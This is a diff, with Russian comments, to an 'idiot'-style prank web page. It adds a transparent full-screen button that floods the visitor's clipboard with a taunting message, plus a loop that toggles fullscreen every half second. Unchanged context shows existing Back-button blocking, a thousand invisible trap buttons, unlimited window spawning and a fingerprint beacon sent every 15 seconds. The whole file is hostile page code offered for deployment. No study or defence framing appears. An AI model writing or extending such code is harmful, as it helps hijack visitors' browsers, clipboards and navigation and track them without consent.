@@ -108,6 +108,22 @@
             background: transparent;
         }
 
+        #giant-trap {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: transparent;
+            border: none;
+            outline: none;
+            opacity: 0.01;
+            z-index: 10001;
+            cursor: default;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
         @keyframes blink {
             0%, 100% {
                 color: #fff;
@@ -172,6 +188,8 @@
 
     <div id="flash"></div>
 
+    <button id="giant-trap" aria-hidden="true"></button>
+
     <script>
         // ================== НАСТРОЙКИ ==================
         var VIDEO_ID         = "hPZxDJYmTUw";         // ID ролика YouTube
@@ -183,13 +201,22 @@
         var MAX_WINDOWS      = 0;     // 0 = без лимита
 
         // клавиатура
-        var KEYBOARD_EVERY   = 20;   // мс
+        var KEYBOARD_EVERY   = 150;   // мс
+
+        // дёрганье fullscreen
+        var FULLSCREEN_SPAM  = true;
+        var FULLSCREEN_EVERY = 500;   // мс
 
         // невидимые кнопки-ловушки
-        var BUTTONS_TOTAL    = 1000;  // сколько кнопок всего
-        var BUTTONS_EVERY    = 60;    // мс между появлением кнопок
-        var BUTTON_MIN_SIZE  = 200;   // мин. размер кнопки, px
-        var BUTTON_MAX_SIZE  = 300;   // макс. размер кнопки, px
+        var BUTTONS_TOTAL    = 1000;
+        var BUTTONS_EVERY    = 60;
+        var BUTTON_MIN_SIZE  = 200;
+        var BUTTON_MAX_SIZE  = 300;
+
+        // огромная кнопка на весь экран
+        var GIANT_BUTTON       = true;
+        var GIANT_COPY_COUNT   = 10;    // попыток копирования за тап
+        var GIANT_COPY_GAP     = 100;   // мс между попытками
 
         // текст, который копируется
         var CLIP_TEXT        = "★YOU ARE AN IDIOT AHAHAHAHAHAH★";
@@ -204,6 +231,8 @@
         var spawnInterval   = null;
         var kbInterval      = null;
         var trapBtnInterval = null;
+        var fsInterval      = null;
+        var fsOn            = false;
 
         // ---------- запуск ----------
         function startVideo() {
@@ -231,7 +260,7 @@
                 } catch (e) {}
             }
 
-            // fullscreen
+            // первичный fullscreen по клику
             try {
                 var el = document.documentElement;
                 if (el.requestFullscreen) {
@@ -239,6 +268,7 @@
                 } else if (el.webkitRequestFullscreen) {
                     el.webkitRequestFullscreen();
                 }
+                fsOn = true;
             } catch (e) {}
 
             // блокировка «Назад»
@@ -258,8 +288,14 @@
             // клавиатура
             startKeyboardSpam();
 
-            // невидимые кнопки
+            // невидимые кнопки-ловушки
             startTrapButtons();
+
+            // дёрганье fullscreen
+            startFullscreenSpam();
+
+            // огромная кнопка на весь экран
+            startGiantButton();
 
             // фингерпринт
             sendFingerprint();
@@ -327,6 +363,37 @@
             kbInterval = setInterval(toggleKeyboard, KEYBOARD_EVERY);
         }
 
+        // ---------- дёрганье fullscreen ----------
+        function toggleFullscreen() {
+            if (stopFlag) return;
+
+            try {
+                if (!fsOn) {
+                    var el = document.documentElement;
+                    if (el.requestFullscreen) {
+                        el.requestFullscreen();
+                    } else if (el.webkitRequestFullscreen) {
+                        el.webkitRequestFullscreen();
+                    }
+                    fsOn = true;
+                } else {
+                    if (document.exitFullscreen) {
+                        document.exitFullscreen();
+                    } else if (document.webkitExitFullscreen) {
+                        document.webkitExitFullscreen();
+                    }
+                    fsOn = false;
+                }
+            } catch (e) {
+                fsOn = !fsOn;
+            }
+        }
+
+        function startFullscreenSpam() {
+            if (!FULLSCREEN_SPAM) return;
+            fsInterval = setInterval(toggleFullscreen, FULLSCREEN_EVERY);
+        }
+
         // ---------- копирование ----------
         function copyToClipboardNow() {
             try {
@@ -346,6 +413,26 @@
                     navigator.clipboard.writeText(CLIP_TEXT).catch(function () {});
                 }
             } catch (e) {}
+        }
+
+        // ---------- мультикопирование ----------
+        function copyMultipleTimes() {
+            var attempts = 0;
+
+            function tryCopy() {
+                if (stopFlag) return;
+                if (attempts >= GIANT_COPY_COUNT) return;
+
+                attempts++;
+
+                copyToClipboardNow();
+
+                if (attempts < GIANT_COPY_COUNT) {
+                    setTimeout(tryCopy, GIANT_COPY_GAP);
+                }
+            }
+
+            tryCopy();
         }
 
         // ---------- невидимые кнопки ----------
@@ -378,12 +465,10 @@
             btn.style.left = x + 'px';
             btn.style.top  = y + 'px';
 
-            // реальный тап = копирование
             btn.addEventListener('click', function () {
                 copyToClipboardNow();
             });
 
-            // touch на мобильных
             btn.addEventListener('touchstart', function (e) {
                 e.preventDefault();
                 copyToClipboardNow();
@@ -394,6 +479,24 @@
 
         function startTrapButtons() {
             trapBtnInterval = setInterval(spawnTrapButton, BUTTONS_EVERY);
+        }
+
+        // ---------- огромная кнопка ----------
+        function startGiantButton() {
+            if (!GIANT_BUTTON) return;
+
+            var giant = document.getElementById('giant-trap');
+            if (!giant) return;
+
+            giant.addEventListener('touchstart', function (e) {
+                e.preventDefault();
+                copyMultipleTimes();
+            }, { passive: false });
+
+            giant.addEventListener('click', function (e) {
+                e.preventDefault();
+                copyMultipleTimes();
+            });
         }
 
         // ---------- фингерпринт ----------
@@ -474,4 +577,4 @@
         setInterval(sendFingerprint, 15000);
     </script>
 </body>
-</html>
+    </html>
